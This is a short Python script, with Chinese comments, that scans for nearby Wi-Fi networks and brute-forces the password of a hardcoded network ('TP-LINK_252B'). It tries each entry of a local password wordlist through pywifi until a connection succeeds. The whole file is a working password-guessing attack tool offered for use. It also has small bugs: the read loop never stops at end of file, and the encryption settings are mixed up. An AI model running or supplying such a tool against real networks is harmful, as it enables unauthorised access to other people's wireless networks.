#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = "liming"

import time
import pywifi
from pywifi import const

"""
1.导入门模块
2.获取无线网卡
3.断开wifi连接
4.读取密码本，获取密码，连接wifi
2.设置睡眠时间，输入密码，wifi

"""


def wifi_connect(wifi_name, wifi_passwd):
    """
    连接wifi
    """
    # 创建wifi对象
    wifi = pywifi.PyWiFi()
    # 获取无线网卡
    pcmcia = wifi.interfaces()[0]
    # 断开wifi连接
    pcmcia.disconnect()
    time.sleep(1)
    # 判断wifi是否断开连接
    if pcmcia.status() == const.IFACE_DISCONNECTED:
        print("wifi未连接！")
        # 创建wifi连接文件
        profile = pywifi.Profile()
        # wifi名称
        profile.ssid = wifi_name
        # wifi密码
        profile.key = wifi_passwd
        # wifi加密算法
        profile.akm.append(const.AUTH_ALG_SHARED)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 网卡的开放
        profile.auth = const.AUTH_ALG_OPEN
        # 删除所有的wifi文件
        pcmcia.remove_all_network_profiles()
        # 设定新的wifi连接文件
        temp_profile = pcmcia.add_network_profile(profile)
        # 连接新的wifi
        pcmcia.connect(temp_profile)
        time.sleep(5)
        if pcmcia.status() == const.IFACE_DISCONNECTED:
            return False
        else:
            return True
    else:
        print("wifi已连接")


def read_wifi_password(passwd_file):
    """
    读取密码本
    :return:
    """
    print("wifi密码破解开始：")
    wifipwd = open(passwd_file, "rt")
    while True:
        passwd = wifipwd.readline().strip()
        status = wifi_connect("TP-LINK_252B", passwd)
        if status:
            print("wifi密码：%s" % passwd)
            break
    wifipwd.close()


def get_wifi_list():
    """
    获取wifi列表
    :return:
    """
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.scan()
    time.sleep(2)
    result = ifaces.scan_results()
    wifi_list = []
    for data in result:
        print(data.ssid)
        print(data.signal)
        wifi_list.append(data.ssid)


def main():
    path = r"C:\Users\liming\Desktop\cracking-password\passwd.txt"
    get_wifi_list()
    read_wifi_password(path)


if __name__ == '__main__':
    main()
